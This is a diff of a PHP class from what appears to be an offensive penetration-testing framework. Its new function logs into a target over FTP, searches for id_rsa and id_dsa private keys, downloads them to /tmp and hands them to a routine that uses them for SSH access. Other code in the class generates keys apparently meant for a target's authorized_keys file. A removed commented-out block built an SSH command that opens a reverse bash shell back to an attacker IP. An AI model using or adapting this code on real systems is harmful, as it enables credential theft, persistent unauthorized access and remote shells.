@@ -132,8 +132,85 @@ class check4linux8protocol extends AUTH{
     }
     
     
-    
     public function ftp2keys($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
+        $this->ssTitre(__FUNCTION__);
+        $this->ftp2keys2get($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
+        //$this->ftp2keys2add($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
+        
+    }
+    
+    
+    public function ftp2keys2get4list($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
+        $this->ssTitre(__FUNCTION__);
+        $result = "";
+        
+    }
+    
+    
+    
+    public function ftp2keys2get($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
+        $this->ssTitre(__FUNCTION__);
+        $result = "";
+        $private_keys_str = "";
+        
+        $ssh_ports = $this->ip2ports4service("ssh");
+        foreach ($ssh_ports as $ssh_open)
+            if(!empty($ssh_open)) {
+                $remote_privkey_filepath = "";
+
+               
+                $tab_dir = $this->ftp2dir($ftp_stream);
+                $this->tab($tab_dir);
+                $this->pause();
+                $this->ssTitre("Searching Private keys");
+                $tab_files = $this->ftp2files($ftp_stream);
+                $this->tab($tab_files);
+                
+                $this->pause();
+                foreach ($tab_files as $file_check ){
+                    $file_check = trim($file_check);
+                    if (strstr($file_check, "id_rsa")!==FALSE) {
+                        $type_crypt = "rsa";
+                        $remote_privkey_filepath = $file_check;
+                    }
+                    if (strstr($file_check, "id_dsa")!==FALSE) {
+                        $type_crypt = "dsa";
+                        $remote_privkey_filepath = $file_check;
+                    }
+                }
+                
+                $this->article("PATH privkey", $remote_privkey_filepath);
+                $this->pause();
+
+ 
+                
+                
+                if (!empty($remote_privkey_filepath)){
+                    $this->article("FTP GET", $remote_privkey_filepath);
+                    $filaname = sha1("$this->port2id.$remote_username_ftp.$remote_userpass_ftp.$remote_privkey_filepath");
+                    ftp_get($ftp_stream, "/tmp/$filaname.priv",$remote_privkey_filepath, FTP_ASCII);
+                    
+                    $query = "cat /tmp/$filaname.priv";
+                    $private_keys_str8tmp = trim($this->req_ret_str($query));
+                    $private_keys_str = $this->key2norme8str($private_keys_str8tmp,$type_crypt);
+                    $this->pause();
+
+                    
+                    $this->key4pentest8attacker("",$private_keys_str,$ssh_open,$type_crypt);
+                }
+                $this->pause();
+            }
+        else {
+            $chaine = "No SSH Service On This Host";
+            $this->log2error($chaine);
+        }
+        
+        return $result;
+    }
+    
+    
+    
+    public function ftp2keys2add($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
         $this->ssTitre(__FUNCTION__);
         $result = "";
         
@@ -166,16 +243,7 @@ class check4linux8protocol extends AUTH{
                 $private_keys_str = $this->key2gen4priv2str("",$type_crypt);
                 $public_authorized_keys_str2use = $this->key2gen4public2str("",$private_keys_str,$type_crypt);
                 
-                /*
-                $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip.$remote_username_ftp.rsa.priv";
-                $obj_file = new FILE("",$private_key_ssh_rsa_file);
-                $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
-                $private_key_passwd = '';
-                $private_keys_str = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file);
-                $public_authorized_keys_str2use = $this->key2gen4public("",10, $private_key_ssh_rsa_file, $public_key_ssh_rsa_file, $private_key_passwd);
-                
-                $this->pause();
-                */
+
                 
                 if (empty($remote_authorized_keys_filepath)){
                     
@@ -234,26 +302,9 @@ class check4linux8protocol extends AUTH{
                     
                     // ftp_site($conn, 'CHMOD 0600 /home/user/privatefile')
                     
-                    $this->key2pentest8attacker("",$remote_username_ftp,$private_keys_str,$ssh_open,$type_crypt);
+                    $this->key4pentest8attacker("",$private_keys_str,$ssh_open,$type_crypt);
                     
-                    /*
-                    $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $remote_username_ftp, $private_key_ssh_rsa_file,$private_key_passwd);
-                    if(is_resource($stream)){
-                        $info = "SSH Private Key:$private_key_ssh_rsa_file";
-                        $this->log2succes($info);
-                        $template_shell = "ssh -i $private_key_ssh_rsa_file -o PasswordAuthentication=no -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $remote_username_ftp@$this->ip -p $ssh_open -C  \"%SHELL%\" ";
-                        $templateB64_shell = base64_encode($template_shell);
-                        $attacker_ip = $this->ip4addr4target($this->ip);
-                        $attacker_port = rand(1024,65535);
-                        $shell = "/bin/bash";
-                        $cmd_rev  = $this->rev8sh($attacker_ip, $attacker_port, $shell);
-                        $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
-                        
-                        $lprotocol = 'T' ;
-                        $type = "server";
-                        $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
-                    }
-                    */
+                    
                     
                     
                 }
